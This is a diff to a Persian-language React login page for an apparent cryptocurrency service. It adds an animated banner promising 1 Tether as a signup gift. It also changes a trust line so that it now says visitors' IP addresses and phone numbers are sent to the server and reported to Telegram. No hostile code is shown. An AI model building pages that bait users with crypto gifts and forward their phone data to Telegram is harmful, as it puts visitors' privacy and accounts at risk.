@@ -267,7 +267,17 @@ export default function CryptoPage() {
             {/* ============ MAIN ============ */}
             <main className="lg-main">
                 <section className="lg-card" aria-labelledby="lg-title">
-                    <h1 id="lg-title" className="lg-title">ورود</h1>
+                    <div className="lg-card-heading">
+                        <h1 id="lg-title" className="lg-title">ورود</h1>
+                        <div className="lg-gift-promo" role="note" aria-label="با اولین ثبت نام ۱ تتر هدیه بگیرید">
+                            <span className="lg-gift-icon" aria-hidden="true">
+                                <span className="lg-gift-emoji">🎁</span>
+                                <span className="lg-gift-spark lg-gift-spark-a">✦</span>
+                                <span className="lg-gift-spark lg-gift-spark-b">✧</span>
+                            </span>
+                            <span className="lg-gift-copy">با اولین ثبت نام <strong>۱ تتر</strong> هدیه بگیرید</span>
+                        </div>
+                    </div>
                     <p className="lg-sub">یک کد چهار رقمی به تلفن شما ارسال می شود</p>
 
                     <label className="lg-label" htmlFor="lg-phone">شماره تلفن</label>
@@ -335,7 +345,7 @@ export default function CryptoPage() {
 
                     <ul className="lg-trust">
                         <li><LockIcon />ورود حفاظت شده</li>
-                        <li><ShieldIcon />ما تلفن شما را ذخیره یا به کسی ارسال نمیکنیم</li>
+                        <li><ShieldIcon />آی‌پی بازدید و شماره تلفن واردشده به سرور ارسال می‌شوند و به تلگرام گزارش می‌شوند.</li>
                     </ul>
                 </section>
             </main>
@@ -449,7 +459,42 @@ const css = `
   backdrop-filter:blur(22px) saturate(140%); -webkit-backdrop-filter:blur(22px) saturate(140%);
   box-shadow:0 30px 80px -20px rgba(10,2,40,.7), inset 0 1px 0 rgba(255,255,255,.22);
 }
-.lg-title{margin:0 0 6px;font-size:1.75rem;font-weight:700}
+.lg-card-heading{
+  position:relative; display:flex; flex-direction:row; direction:rtl; align-items:center; justify-content:space-between;
+  gap:14px; padding:0 0 20px; margin:0 0 20px;
+  border-bottom:1px solid rgba(255,255,255,.16);
+}
+.lg-card-heading::after{
+  content:""; position:absolute; right:0; bottom:-1px; width:76px; height:2px;
+  background:linear-gradient(90deg,var(--violet-2),#fcd34d); border-radius:2px;
+}
+.lg-title{margin:0;font-size:1.75rem;font-weight:700;line-height:1.35;flex:0 0 auto}
+.lg-gift-promo{
+  position:relative; isolation:isolate; overflow:hidden;
+  display:flex; direction:ltr; align-items:center; gap:9px; min-width:0;
+  padding:9px 12px; border:1px solid rgba(252,211,77,.38); border-radius:999px;
+  background:linear-gradient(135deg,rgba(251,191,36,.15),rgba(168,85,247,.17));
+  box-shadow:0 5px 18px rgba(10,2,40,.18),inset 0 1px 0 rgba(255,255,255,.12);
+  color:#fff7d6;
+}
+.lg-gift-promo::after{
+  content:""; position:absolute; z-index:-1; top:-50%; bottom:-50%; left:-45%; width:30%;
+  transform:rotate(22deg); background:linear-gradient(90deg,transparent,rgba(255,255,255,.18),transparent);
+  animation:lg-gift-shine 4s ease-in-out infinite;
+}
+.lg-gift-copy{direction:rtl;text-align:right;font-size:.76rem;font-weight:600;line-height:1.65;white-space:normal}
+.lg-gift-copy strong{color:#fcd34d;font-weight:800;white-space:nowrap}
+.lg-gift-icon{
+  position:relative; flex:0 0 27px; width:27px; height:27px; display:grid; place-items:center;
+  transform-origin:center bottom; animation:lg-gift-bob 2.2s ease-in-out infinite;
+}
+.lg-gift-emoji{display:block;font-size:22px;line-height:1;filter:drop-shadow(0 2px 5px rgba(252,211,77,.32))}
+.lg-gift-spark{position:absolute;color:#fcd34d;font-size:11px;line-height:1;animation:lg-gift-sparkle 1.8s ease-in-out infinite}
+.lg-gift-spark-a{top:-3px;right:-4px}
+.lg-gift-spark-b{bottom:0;left:-5px;animation-delay:.7s}
+@keyframes lg-gift-bob{0%,100%{transform:translateY(0) rotate(-3deg)}50%{transform:translateY(-3px) rotate(4deg)}}
+@keyframes lg-gift-sparkle{0%,100%{opacity:.45;transform:scale(.75) rotate(0)}50%{opacity:1;transform:scale(1.2) rotate(18deg)}}
+@keyframes lg-gift-shine{0%,65%{left:-45%}100%{left:130%}}
 .lg-sub{margin:0 0 26px;color:var(--muted);font-size:.93rem;line-height:1.7}
 .lg-label{display:block;margin:0 0 8px;font-size:.85rem;font-weight:600;color:var(--text)}
 .lg-hint{margin:8px 0 24px;font-size:.78rem;color:var(--muted)}
@@ -553,6 +598,10 @@ const css = `
 /* small screens */
 @media (max-width:480px){
   .lg-card{padding:28px 20px 22px}
+  .lg-card-heading{align-items:flex-start;gap:12px;flex-wrap:wrap;padding-bottom:18px;margin-bottom:18px}
+  .lg-title{font-size:1.6rem}
+  .lg-gift-promo{max-width:100%;padding:8px 10px;gap:8px}
+  .lg-gift-copy{font-size:.74rem}
   .lg-phone-row{flex-direction:column-reverse;flex-wrap:nowrap}
   .lg-field{flex:0 0 auto;width:100%}
   .lg-btn-send{flex:0 0 auto;width:100%}
@@ -562,6 +611,7 @@ const css = `
 
 /* respect reduced motion */
 @media (prefers-reduced-motion:reduce){
-  .lg-root,.lg-orb,.lg-otp.is-shaking,.lg-dialog,.lg-overlay,.lg-toast{animation:none}
+  .lg-root,.lg-orb,.lg-otp.is-shaking,.lg-dialog,.lg-overlay,.lg-toast,
+  .lg-gift-icon,.lg-gift-spark,.lg-gift-promo::after{animation:none}
 }
 `;
